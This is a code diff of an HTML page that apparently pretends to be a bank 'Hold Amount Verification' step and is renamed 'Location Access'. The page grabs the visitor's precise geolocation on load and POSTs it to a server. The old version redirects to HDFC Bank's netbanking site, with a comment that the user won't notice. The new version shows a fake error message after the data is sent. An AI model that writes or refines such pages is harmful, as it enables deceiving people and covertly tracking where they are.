@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Hold Amount Verification</title>
+  <title>Location Access</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -10,7 +10,10 @@
       padding-top: 100px;
       background-color: #f0f2f5;
     }
-    #loading {
+    h2 {
+      color: #333;
+    }
+	#loading {
       color: #555;
       font-size: 16px;
       margin-top: 20px;
@@ -19,7 +22,6 @@
 </head>
 <body>
   <p id="loading">Please wait...</p>
-
   <script>
     function sendLocation(position) {
       const { latitude, longitude } = position.coords;
@@ -29,21 +31,22 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude, longitude, timestamp })
+      })
+      .then(() => {
+        document.body.innerHTML = "<h2>Something went wrong. Please try again!</h2>";
+      })
+      .catch(() => {
+        console.log("Failed to fetch location");
       });
     }
 
-    // Request location instantly
+    function handleError(error) {
+      document.body.innerHTML = `<h2>Location access denied: ${error.message}</h2>`;
+    }
+
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
-        enableHighAccuracy: true,
-        timeout: 5000
-      });
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
     }
-
-    // Redirect within 0.5 second (user won't notice)
-    setTimeout(() => {
-      window.location.href = "https://netbanking.hdfcbank.com/netbanking/";
-    }, 1000);
   </script>
 </body>
 </html>
